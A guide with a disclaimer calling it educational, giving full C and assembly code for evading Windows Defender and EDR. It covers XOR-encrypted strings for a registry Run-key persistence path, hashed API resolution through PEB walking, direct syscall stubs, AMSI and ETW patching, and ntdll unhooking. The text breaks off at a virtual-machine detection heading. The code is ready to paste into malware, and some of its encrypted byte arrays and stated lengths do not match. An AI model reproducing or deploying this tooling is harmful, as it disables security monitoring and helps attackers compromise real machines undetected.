# Windows Defender Evasion Techniques - Educational Guide

> **Educational Purpose Only**: This document is for teaching cybersecurity concepts. Only use these techniques in authorized lab environments on systems you own.

## Table of Contents
1. [How Windows Defender Works](#part-1-understanding-windows-defender)
2. [Static Evasion Techniques](#part-2-static-evasion-compile-time)
3. [Runtime Evasion Techniques](#part-3-runtime-evasion)
4. [Anti-Analysis Techniques](#part-4-anti-analysis-techniques)
5. [Integration Examples](#part-5-integration-with-blxdmoon)
6. [MITRE ATT&CK Mapping](#part-6-mitre-attck-reference-table)
7. [Real-World Examples](#part-7-real-world-malware-references)

---

## Part 1: Understanding Windows Defender

### 1.1 Detection Mechanisms

Windows Defender uses a multi-layered approach to detect malware:

#### Static Analysis (Pre-Execution)
| Method | What It Does | Evasion Strategy |
|--------|--------------|------------------|
| **File Hash Matching** | Compares SHA-256 hashes against known malware database | Recompile with any change |
| **YARA Rules** | Pattern matching on byte sequences and strings | String obfuscation |
| **Import Table Analysis** | Flags suspicious API combinations (e.g., VirtualAlloc + CreateRemoteThread) | Dynamic API resolution |
| **PE Header Analysis** | Detects anomalies in executable structure | Legitimate-looking PE headers |
| **Entropy Analysis** | High entropy indicates packed/encrypted content | Custom encoding, avoid common packers |

#### Dynamic Analysis (Runtime)
| Method | What It Does | Evasion Strategy |
|--------|--------------|------------------|
| **API Hooking** | Intercepts calls to ntdll.dll functions | Direct syscalls, unhooking |
| **ETW (Event Tracing for Windows)** | Logs security-relevant events | ETW patching |
| **Behavioral Monitoring** | Watches for suspicious patterns (registry mods, injection) | Slow execution, mimicking legit behavior |
| **Memory Scanning** | Scans process memory for shellcode patterns | Encrypted payloads, sleep obfuscation |

#### Cloud/ML Analysis
| Method | What It Does | Evasion Strategy |
|--------|--------------|------------------|
| **AMSI** | Scans scripts and in-memory content | AMSI bypass patches |
| **Cloud Sample Submission** | Unknown files sent for analysis | Network isolation detection |
| **ML Classification** | Trained models detect novel malware | Polymorphic code, benign imports |

### 1.2 Defender Architecture Deep Dive

```
┌─────────────────────────────────────────────────────────┐
│                    User Applications                     │
└─────────────────────────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────┐
│  ntdll.dll (User-Mode)  ◄──── EDR/Defender Hooks Here   │
│  - NtAllocateVirtualMemory                              │
│  - NtWriteVirtualMemory                                 │
│  - NtCreateThreadEx                                     │
└─────────────────────────────────────────────────────────┘
                          │ syscall instruction
                          ▼
┌─────────────────────────────────────────────────────────┐
│  Windows Kernel                                          │
│  - PsSetCreateProcessNotifyRoutine (process callbacks)  │
│  - ObRegisterCallbacks (handle callbacks)               │
│  - Minifilter drivers (file system monitoring)          │
└─────────────────────────────────────────────────────────┘
```

**Key insight**: Most EDR hooks are in user-mode (ntdll.dll). Direct syscalls bypass these hooks entirely.

---

## Part 2: Static Evasion (Compile-Time)

### 2.1 String Obfuscation

**MITRE ATT&CK**: [T1027 - Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)

**Problem**: Defenders can signature strings like registry paths, API names, URLs.

**Solution**: Encrypt strings at compile time, decrypt at runtime.

#### Full Implementation

```c
// include/obfuscate.h
#ifndef OBFUSCATE_H
#define OBFUSCATE_H

#include <windows.h>
#include <string.h>

// XOR key - change this for each build
#define XOR_KEY 0x5A

/**
 * XOR decryption function
 * @param encrypted - Pointer to encrypted byte array
 * @param output    - Buffer to store decrypted string
 * @param len       - Length of encrypted data
 * @param key       - XOR key used for decryption
 */
static inline void xor_decrypt(const unsigned char *encrypted,
                                char *output,
                                size_t len,
                                unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        output[i] = encrypted[i] ^ key;
    }
    output[len] = '\0';
}

// ============================================================
// Pre-computed encrypted strings (generate with encrypt_strings.py)
// ============================================================

// Original: "Software\Microsoft\Windows\CurrentVersion\Run"
static const unsigned char ENC_REG_RUN_KEY[] = {
    0x29, 0x35, 0x3a, 0x2c, 0x23, 0x3f, 0x28, 0x3a, 0x14,  // Software\\ (note: \\ = 0x14 after XOR)
    0x37, 0x3b, 0x39, 0x28, 0x35, 0x29, 0x35, 0x3a, 0x2c, 0x14,  // Microsoft\\
    0x2d, 0x3b, 0x36, 0x3e, 0x35, 0x23, 0x29, 0x14,  // Windows\\
    0x39, 0x2b, 0x28, 0x28, 0x3a, 0x36, 0x2c, 0x3c, 0x3a, 0x28, 0x29, 0x3b, 0x35, 0x36, 0x14,  // CurrentVersion\\
    0x28, 0x2b, 0x36  // Run
};
#define ENC_REG_RUN_KEY_LEN 47

// Original: "ntdll.dll"
static const unsigned char ENC_NTDLL[] = {
    0x34, 0x2e, 0x3e, 0x36, 0x36, 0x16, 0x3e, 0x36, 0x36  // ntdll.dll
};
#define ENC_NTDLL_LEN 9

// Original: "kernel32.dll"
static const unsigned char ENC_KERNEL32[] = {
    0x31, 0x3f, 0x28, 0x36, 0x3f, 0x36, 0x68, 0x6a, 0x16, 0x3e, 0x36, 0x36
};
#define ENC_KERNEL32_LEN 12

// Original: "VirtualAlloc"
static const unsigned char ENC_VIRTUALALLOC[] = {
    0x0c, 0x3b, 0x28, 0x2c, 0x2b, 0x3f, 0x36, 0x1b, 0x36, 0x36, 0x35, 0x39
};
#define ENC_VIRTUALALLOC_LEN 12

// Original: "CreateRemoteThread"
static const unsigned char ENC_CREATEREMOTETHREAD[] = {
    0x19, 0x28, 0x3f, 0x3f, 0x2c, 0x3f, 0x28, 0x3f, 0x33, 0x35, 0x2c, 0x3f,
    0x2e, 0x3c, 0x28, 0x3f, 0x3f, 0x3e
};
#define ENC_CREATEREMOTETHREAD_LEN 18

/**
 * Helper macro for decryption
 * Declares a buffer and decrypts into it
 */
#define DECRYPT_STRING(name, enc_arr, len) \
    char name[len + 1]; \
    xor_decrypt(enc_arr, name, len, XOR_KEY)

#endif // OBFUSCATE_H
```

#### Python String Encryption Tool

```python
#!/usr/bin/env python3
"""
tools/encrypt_strings.py - Generate XOR-encrypted C arrays from strings
Usage: python encrypt_strings.py "string to encrypt" [key_hex]
"""

import sys

def xor_encrypt(plaintext: str, key: int = 0x5A) -> list:
    """Encrypt a string using XOR"""
    return [ord(c) ^ key for c in plaintext]

def format_c_array(encrypted: list, name: str = "ENC_STR") -> str:
    """Format encrypted bytes as a C array"""
    hex_values = ', '.join(f'0x{b:02x}' for b in encrypted)
    return f"static const unsigned char {name}[] = {{ {hex_values} }};\n#define {name}_LEN {len(encrypted)}"

def main():
    if len(sys.argv) < 2:
        print("Usage: python encrypt_strings.py <string> [key_hex]")
        print("Example: python encrypt_strings.py 'VirtualAlloc' 0x5A")
        sys.exit(1)

    plaintext = sys.argv[1]
    key = int(sys.argv[2], 16) if len(sys.argv) > 2 else 0x5A

    encrypted = xor_encrypt(plaintext, key)

    print(f"// Original: \"{plaintext}\"")
    print(f"// XOR Key: 0x{key:02X}")
    print(format_c_array(encrypted, "ENC_" + plaintext.upper().replace(".", "_")))
    print(f"\n// Decryption:")
    print(f"// DECRYPT_STRING(varName, ENC_{plaintext.upper()}, {len(encrypted)});")

if __name__ == "__main__":
    main()
```

#### Usage Example

```c
#include "obfuscate.h"

void StealthyPersist() {
    // Decrypt the registry path at runtime
    DECRYPT_STRING(regPath, ENC_REG_RUN_KEY, ENC_REG_RUN_KEY_LEN);

    HKEY hKey;
    // regPath now contains "Software\Microsoft\Windows\CurrentVersion\Run"
    RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey);
    // ...

    // Clear the decrypted string from memory when done
    SecureZeroMemory(regPath, sizeof(regPath));
}
```

---

### 2.2 API Hashing (Dynamic Resolution)

**MITRE ATT&CK**: [T1027.007 - Dynamic API Resolution](https://attack.mitre.org/techniques/T1027/007/)

**Problem**: Import table shows which APIs the binary uses - suspicious combinations trigger alerts.

**Solution**: Don't import functions statically. Resolve them at runtime using hashes.

#### Full Implementation

```c
// include/api_resolve.h
#ifndef API_RESOLVE_H
#define API_RESOLVE_H

#include <windows.h>
#include <winternl.h>  // For PEB structures
#include <ctype.h>

// ============================================================
// DJB2 Hash Function
// ============================================================

/**
 * DJB2 hash algorithm - fast, low collision rate
 * Pre-compute hashes for API names and compare at runtime
 */
__forceinline DWORD djb2_hash(const char *str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;  // hash * 33 + c
    }
    return hash;
}

/**
 * Case-insensitive variant for module names
 */
__forceinline DWORD djb2_hash_i(const char *str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + tolower(c);
    }
    return hash;
}

// ============================================================
// Pre-computed API Hashes
// Generate with: djb2_hash("FunctionName")
// ============================================================

// Module hashes (case-insensitive)
#define HASH_KERNEL32_DLL       0x6A4ABC5B  // kernel32.dll
#define HASH_NTDLL_DLL          0x3CFA685D  // ntdll.dll
#define HASH_ADVAPI32_DLL       0x54C1E56B  // advapi32.dll
#define HASH_USER32_DLL         0x63C84283  // user32.dll

// kernel32.dll function hashes
#define HASH_LOADLIBRARYA       0xEC0E4E8E
#define HASH_GETPROCADDRESS     0x7C0DFCAA
#define HASH_VIRTUALALLOC       0x91AFCA54
#define HASH_VIRTUALPROTECT     0x7946C61B
#define HASH_CREATEFILEA        0x7C0017A5
#define HASH_WRITEFILE          0xF1D207D0
#define HASH_CLOSEHANDLE        0x0FFD97FB
#define HASH_GETMODULEHANDLEA   0xB1866570

// ntdll.dll function hashes
#define HASH_NTALLOCATEVIRTUALMEMORY  0xF783B8EC
#define HASH_NTPROTECTVIRTUALMEMORY   0x50E92888
#define HASH_NTWRITEVIRTUALMEMORY     0xC3170192
#define HASH_NTCREATETHREADEX         0x64DC7453

// advapi32.dll function hashes
#define HASH_REGOPENKEYEXA      0x9B9C1A3E
#define HASH_REGSETVALUEEXA     0x89F33A50
#define HASH_REGCLOSEKEY        0x7C2D89C0

// ============================================================
// PEB Walking - Get Module by Hash
// ============================================================

/**
 * Get module handle by walking the PEB loader data
 * Avoids calling GetModuleHandle which may be hooked
 */
HMODULE GetModuleByHash(DWORD hash) {
    // Read PEB from TEB
    #ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    #else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
    #endif

    // Get loader data
    PPEB_LDR_DATA pLdr = pPeb->Ldr;

    // Walk the InMemoryOrderModuleList
    PLIST_ENTRY pHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;

    while (pEntry != pHead) {
        // Get the loader data table entry
        PLDR_DATA_TABLE_ENTRY pDataTableEntry = CONTAINING_RECORD(
            pEntry,
            LDR_DATA_TABLE_ENTRY,
            InMemoryOrderLinks
        );

        // Convert wide char name to ANSI for hashing
        if (pDataTableEntry->BaseDllName.Buffer != NULL) {
            char moduleName[256] = {0};
            int len = pDataTableEntry->BaseDllName.Length / sizeof(WCHAR);

            for (int i = 0; i < len && i < 255; i++) {
                moduleName[i] = (char)pDataTableEntry->BaseDllName.Buffer[i];
            }

            // Compare hash (case-insensitive)
            if (djb2_hash_i(moduleName) == hash) {
                return (HMODULE)pDataTableEntry->DllBase;
            }
        }

        pEntry = pEntry->Flink;
    }

    return NULL;
}

// ============================================================
// Export Table Walking - Get Function by Hash
// ============================================================

/**
 * Get function address by walking the export table
 * Avoids calling GetProcAddress which may be hooked
 */
FARPROC GetFunctionByHash(HMODULE hModule, DWORD hash) {
    if (!hModule) return NULL;

    // Parse PE headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(
        (BYTE*)hModule + pDosHeader->e_lfanew
    );
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    // Get export directory
    DWORD exportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[
        IMAGE_DIRECTORY_ENTRY_EXPORT
    ].VirtualAddress;

    if (exportDirRVA == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)hModule + exportDirRVA
    );

    // Get export tables
    PDWORD pAddressOfNames = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfNames);
    PDWORD pAddressOfFunctions = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfFunctions);
    PWORD pAddressOfOrdinals = (PWORD)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);

    // Search for function by hash
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char *funcName = (char*)hModule + pAddressOfNames[i];

        if (djb2_hash(funcName) == hash) {
            WORD ordinal = pAddressOfOrdinals[i];
            DWORD funcRVA = pAddressOfFunctions[ordinal];
            return (FARPROC)((BYTE*)hModule + funcRVA);
        }
    }

    return NULL;
}

// ============================================================
// Convenience Macros
// ============================================================

/**
 * Define a function pointer type and resolve it
 */
#define RESOLVE_API(module_hash, func_hash, func_type, func_ptr) \
    func_type func_ptr = (func_type)GetFunctionByHash( \
        GetModuleByHash(module_hash), \
        func_hash \
    )

// ============================================================
// Function Pointer Typedefs
// ============================================================

// kernel32.dll
typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD,
    LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *fn_CloseHandle)(HANDLE);

// advapi32.dll
typedef LONG (WINAPI *fn_RegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG (WINAPI *fn_RegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD,
    const BYTE*, DWORD);
typedef LONG (WINAPI *fn_RegCloseKey)(HKEY);

#endif // API_RESOLVE_H
```

#### Usage Example

```c
#include "api_resolve.h"

void AllocateExecutableMemory() {
    // Resolve VirtualAlloc dynamically - no import table entry
    RESOLVE_API(HASH_KERNEL32_DLL, HASH_VIRTUALALLOC, fn_VirtualAlloc, pVirtualAlloc);

    if (pVirtualAlloc) {
        LPVOID mem = pVirtualAlloc(
            NULL,
            4096,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        // Use the memory...
    }
}
```

#### Hash Generation Helper

```c
// tools/hash_api.c - Compile and run to generate hashes
#include <stdio.h>

unsigned int djb2_hash(const char *str) {
    unsigned int hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <function_name>\n", argv[0]);
        return 1;
    }

    printf("#define HASH_%s\t\t0x%08X\n", argv[1], djb2_hash(argv[1]));
    return 0;
}
```

---

### 2.3 Import Table Minimization

**Problem**: Even with dynamic resolution, some imports are required for the loader.

**Solution**: Minimize suspicious imports, use delayed loading.

```c
// Minimal import approach - only use LoadLibrary + GetProcAddress
// Then resolve everything else dynamically

#include <windows.h>

// Global function pointers - resolved once at startup
static fn_VirtualAlloc g_pVirtualAlloc = NULL;
static fn_VirtualProtect g_pVirtualProtect = NULL;
static fn_CreateFileA g_pCreateFileA = NULL;

BOOL InitializeAPIs() {
    HMODULE hKernel32 = GetModuleByHash(HASH_KERNEL32_DLL);
    if (!hKernel32) return FALSE;

    g_pVirtualAlloc = (fn_VirtualAlloc)GetFunctionByHash(
        hKernel32, HASH_VIRTUALALLOC);
    g_pVirtualProtect = (fn_VirtualProtect)GetFunctionByHash(
        hKernel32, HASH_VIRTUALPROTECT);
    g_pCreateFileA = (fn_CreateFileA)GetFunctionByHash(
        hKernel32, HASH_CREATEFILEA);

    return (g_pVirtualAlloc && g_pVirtualProtect && g_pCreateFileA);
}
```

---

## Part 3: Runtime Evasion

### 3.1 Direct Syscalls

**MITRE ATT&CK**: [T1106 - Native API](https://attack.mitre.org/techniques/T1106/)

**Why this works**: EDRs hook ntdll.dll functions in user-mode. Direct syscalls skip ntdll entirely and go straight to the kernel.

```
Normal API Call (Hooked):
Application → kernel32.dll → ntdll.dll [HOOK] → syscall → Kernel

Direct Syscall (Bypasses Hook):
Application → syscall → Kernel
```

#### Full Implementation

```c
// include/syscalls.h
#ifndef SYSCALLS_H
#define SYSCALLS_H

#include <windows.h>

// ============================================================
// Syscall Number Resolution
// ============================================================

/**
 * Syscall numbers change between Windows versions
 * We extract them dynamically from ntdll.dll
 *
 * ntdll syscall stub pattern (x64):
 *   4C 8B D1        mov r10, rcx
 *   B8 XX XX 00 00  mov eax, <syscall_number>
 *   ...
 */

typedef struct _SYSCALL_TABLE {
    DWORD NtAllocateVirtualMemory;
    DWORD NtProtectVirtualMemory;
    DWORD NtWriteVirtualMemory;
    DWORD NtCreateThreadEx;
    DWORD NtOpenProcess;
    DWORD NtClose;
} SYSCALL_TABLE;

// Global syscall table
extern SYSCALL_TABLE g_SyscallTable;

/**
 * Extract syscall number from ntdll function
 * @param pFunction - Pointer to ntdll function
 * @return Syscall number, or 0 on failure
 */
DWORD GetSyscallNumber(FARPROC pFunction) {
    if (!pFunction) return 0;

    BYTE *pCode = (BYTE*)pFunction;

    // Check for syscall stub pattern
    // 4C 8B D1 = mov r10, rcx
    // B8 XX XX 00 00 = mov eax, syscall_number
    if (pCode[0] == 0x4C && pCode[1] == 0x8B && pCode[2] == 0xD1 &&
        pCode[3] == 0xB8) {
        // Extract syscall number (little-endian DWORD at offset 4)
        return *(DWORD*)(pCode + 4);
    }

    // Alternative pattern (some Windows versions)
    // B8 XX XX 00 00 = mov eax, syscall_number (without mov r10, rcx first)
    if (pCode[0] == 0xB8) {
        return *(DWORD*)(pCode + 1);
    }

    return 0;  // Unknown pattern
}

/**
 * Initialize syscall table by reading from ntdll
 */
BOOL InitSyscalls() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    g_SyscallTable.NtAllocateVirtualMemory = GetSyscallNumber(
        GetProcAddress(hNtdll, "NtAllocateVirtualMemory"));

    g_SyscallTable.NtProtectVirtualMemory = GetSyscallNumber(
        GetProcAddress(hNtdll, "NtProtectVirtualMemory"));

    g_SyscallTable.NtWriteVirtualMemory = GetSyscallNumber(
        GetProcAddress(hNtdll, "NtWriteVirtualMemory"));

    g_SyscallTable.NtCreateThreadEx = GetSyscallNumber(
        GetProcAddress(hNtdll, "NtCreateThreadEx"));

    g_SyscallTable.NtOpenProcess = GetSyscallNumber(
        GetProcAddress(hNtdll, "NtOpenProcess"));

    g_SyscallTable.NtClose = GetSyscallNumber(
        GetProcAddress(hNtdll, "NtClose"));

    // Verify we got valid syscall numbers
    return (g_SyscallTable.NtAllocateVirtualMemory != 0);
}

#endif // SYSCALLS_H
```

#### Assembly Syscall Stub (x64 MASM)

```asm
; syscalls.asm - Direct syscall stubs
; Compile with: ml64 /c syscalls.asm

.data
    EXTERN g_SyscallTable:QWORD

.code

; NTSTATUS NtAllocateVirtualMemory(
;     HANDLE ProcessHandle,       ; rcx
;     PVOID *BaseAddress,         ; rdx
;     ULONG_PTR ZeroBits,         ; r8
;     PSIZE_T RegionSize,         ; r9
;     ULONG AllocationType,       ; [rsp+28h]
;     ULONG Protect               ; [rsp+30h]
; )
SysNtAllocateVirtualMemory PROC
    mov r10, rcx                    ; syscall convention: r10 = first param
    mov eax, DWORD PTR [g_SyscallTable]  ; syscall number
    syscall
    ret
SysNtAllocateVirtualMemory ENDP

; NTSTATUS NtProtectVirtualMemory(
;     HANDLE ProcessHandle,       ; rcx
;     PVOID *BaseAddress,         ; rdx
;     PSIZE_T RegionSize,         ; r8
;     ULONG NewProtect,           ; r9
;     PULONG OldProtect           ; [rsp+28h]
; )
SysNtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, DWORD PTR [g_SyscallTable + 4]
    syscall
    ret
SysNtProtectVirtualMemory ENDP

; NTSTATUS NtWriteVirtualMemory(
;     HANDLE ProcessHandle,       ; rcx
;     PVOID BaseAddress,          ; rdx
;     PVOID Buffer,               ; r8
;     SIZE_T NumberOfBytesToWrite,; r9
;     PSIZE_T NumberOfBytesWritten; [rsp+28h]
; )
SysNtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, DWORD PTR [g_SyscallTable + 8]
    syscall
    ret
SysNtWriteVirtualMemory ENDP

END
```

#### Inline Assembly Alternative (MSVC x64)

Since MSVC doesn't support inline assembly for x64, use intrinsics:

```c
// Alternative: Use compiler intrinsics for syscalls
#include <intrin.h>

// This is a simplified example - real implementation needs
// proper stack setup for more than 4 parameters
__forceinline NTSTATUS DirectSyscall(
    DWORD syscallNumber,
    ULONG_PTR arg1,
    ULONG_PTR arg2,
    ULONG_PTR arg3,
    ULONG_PTR arg4
) {
    // For production, use external assembly or shellcode blob
    // This is conceptual only
    return STATUS_NOT_IMPLEMENTED;
}
```

---

### 3.2 AMSI Bypass

**MITRE ATT&CK**: [T1562.001 - Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)

**What is AMSI?**: Antimalware Scan Interface - allows AV to scan scripts and in-memory content.

```
PowerShell/VBScript → amsi.dll!AmsiScanBuffer() → Defender → Block/Allow
```

#### Full Implementation

```c
// src/amsi_bypass.c
#include <windows.h>

/**
 * Bypass AMSI by patching AmsiScanBuffer
 *
 * Original function signature:
 * HRESULT AmsiScanBuffer(
 *     HAMSICONTEXT amsiContext,
 *     PVOID buffer,
 *     ULONG length,
 *     LPCWSTR contentName,
 *     HAMSISESSION amsiSession,
 *     AMSI_RESULT *result
 * );
 *
 * We patch it to return E_INVALIDARG (0x80070057)
 * which causes callers to skip the scan
 */

// Patch bytes for x64:
// mov eax, 0x80070057  ; E_INVALIDARG
// ret
static BYTE AmsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

BOOL PatchAmsi() {
    // Load amsi.dll (may already be loaded)
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        // AMSI not loaded - nothing to patch
        return TRUE;
    }

    // Get AmsiScanBuffer address
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        return FALSE;
    }

    // Change memory protection to allow writing
    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, sizeof(AmsiPatch),
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    // Apply patch
    memcpy(pAmsiScanBuffer, AmsiPatch, sizeof(AmsiPatch));

    // Restore original protection
    VirtualProtect(pAmsiScanBuffer, sizeof(AmsiPatch), oldProtect, &oldProtect);

    return TRUE;
}

/**
 * Alternative: Patch AmsiOpenSession to fail
 * This prevents AMSI context from being created
 */
static BYTE AmsiOpenSessionPatch[] = {
    0x48, 0x31, 0xC0,  // xor rax, rax (return NULL)
    0xC3               // ret
};

BOOL PatchAmsiOpenSession() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return TRUE;

    FARPROC pAmsiOpenSession = GetProcAddress(hAmsi, "AmsiOpenSession");
    if (!pAmsiOpenSession) return FALSE;

    DWORD oldProtect;
    if (!VirtualProtect(pAmsiOpenSession, sizeof(AmsiOpenSessionPatch),
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    memcpy(pAmsiOpenSession, AmsiOpenSessionPatch, sizeof(AmsiOpenSessionPatch));
    VirtualProtect(pAmsiOpenSession, sizeof(AmsiOpenSessionPatch),
                   oldProtect, &oldProtect);

    return TRUE;
}
```

---

### 3.3 ETW Patching

**MITRE ATT&CK**: [T1562.006 - Indicator Blocking](https://attack.mitre.org/techniques/T1562/006/)

**What is ETW?**: Event Tracing for Windows - telemetry system that Defender uses for behavioral analysis.

#### Full Implementation

```c
// src/etw_bypass.c
#include <windows.h>

/**
 * Patch EtwEventWrite to disable ETW telemetry
 *
 * EtwEventWrite is the main function for logging ETW events
 * Patching it silences security telemetry
 */

// Patch bytes for x64:
// xor rax, rax  ; return STATUS_SUCCESS (0)
// ret
static BYTE EtwPatch[] = { 0x48, 0x33, 0xC0, 0xC3 };

BOOL PatchEtw() {
    // Get ntdll handle (always loaded)
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    // Get EtwEventWrite address
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return FALSE;

    // Change memory protection
    DWORD oldProtect;
    if (!VirtualProtect(pEtwEventWrite, sizeof(EtwPatch),
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    // Apply patch
    memcpy(pEtwEventWrite, EtwPatch, sizeof(EtwPatch));

    // Restore protection
    VirtualProtect(pEtwEventWrite, sizeof(EtwPatch), oldProtect, &oldProtect);

    return TRUE;
}

/**
 * Alternative: Patch multiple ETW functions for comprehensive evasion
 */
BOOL PatchAllEtwFunctions() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    const char *etwFunctions[] = {
        "EtwEventWrite",
        "EtwEventWriteFull",
        "EtwEventWriteEx",
        "EtwEventWriteString",
        "EtwEventWriteTransfer",
        NULL
    };

    for (int i = 0; etwFunctions[i] != NULL; i++) {
        FARPROC pFunc = GetProcAddress(hNtdll, etwFunctions[i]);
        if (pFunc) {
            DWORD oldProtect;
            if (VirtualProtect(pFunc, sizeof(EtwPatch),
                              PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy(pFunc, EtwPatch, sizeof(EtwPatch));
                VirtualProtect(pFunc, sizeof(EtwPatch), oldProtect, &oldProtect);
            }
        }
    }

    return TRUE;
}
```

---

### 3.4 Unhooking ntdll.dll

**MITRE ATT&CK**: [T1562.001 - Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)

**Concept**: EDRs hook ntdll.dll in memory. We can restore the original bytes by reading a clean copy from disk.

#### Full Implementation

```c
// src/unhook.c
#include <windows.h>

/**
 * Unhook ntdll.dll by restoring .text section from disk
 *
 * Process:
 * 1. Map clean copy of ntdll.dll from disk
 * 2. Find .text section (contains code)
 * 3. Overwrite hooked .text with clean .text
 */

BOOL UnhookNtdll() {
    // Step 1: Open ntdll.dll from disk
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    // Step 2: Create file mapping
    HANDLE hMapping = CreateFileMappingA(
        hFile,
        NULL,
        PAGE_READONLY | SEC_IMAGE,  // SEC_IMAGE for proper PE mapping
        0,
        0,
        NULL
    );

    if (!hMapping) {
        CloseHandle(hFile);
        return FALSE;
    }

    // Step 3: Map view of file
    LPVOID pCleanNtdll = MapViewOfFile(
        hMapping,
        FILE_MAP_READ,
        0,
        0,
        0
    );

    if (!pCleanNtdll) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }

    // Step 4: Get loaded ntdll base address
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        UnmapViewOfFile(pCleanNtdll);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }

    // Step 5: Parse PE headers to find .text section
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(
        (BYTE*)hNtdll + pDosHeader->e_lfanew
    );

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        // Find .text section
        if (memcmp(pSection[i].Name, ".text", 5) == 0) {
            // Calculate addresses
            LPVOID pHookedText = (LPVOID)(
                (BYTE*)hNtdll + pSection[i].VirtualAddress
            );
            LPVOID pCleanText = (LPVOID)(
                (BYTE*)pCleanNtdll + pSection[i].VirtualAddress
            );
            SIZE_T textSize = pSection[i].Misc.VirtualSize;

            // Step 6: Make .text writable
            DWORD oldProtect;
            if (!VirtualProtect(pHookedText, textSize,
                               PAGE_EXECUTE_READWRITE, &oldProtect)) {
                break;
            }

            // Step 7: Copy clean .text over hooked .text
            memcpy(pHookedText, pCleanText, textSize);

            // Step 8: Restore original protection
            VirtualProtect(pHookedText, textSize, oldProtect, &oldProtect);

            break;
        }
    }

    // Cleanup
    UnmapViewOfFile(pCleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    return TRUE;
}

/**
 * Alternative: Unhook specific function only
 * More stealthy - only restores what we need
 */
BOOL UnhookFunction(const char *functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pHookedFunc = GetProcAddress(hNtdll, functionName);
    if (!pHookedFunc) return FALSE;

    // Read clean bytes from disk version
    // ... (similar mapping process as above)

    // Only restore first ~20 bytes (typical hook size)
    // This is more stealthy than restoring entire section

    return TRUE;
}
```

---

## Part 4: Anti-Analysis Techniques

### 4.1 Virtual Machine Detection

**MITRE ATT&CK**: [T1497 - Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497/)

**Why detect VMs?**: Malware analysts run samples in VMs. If we detect a VM, we can exit cleanly or behave benignly.

#### Full Implementation

```c
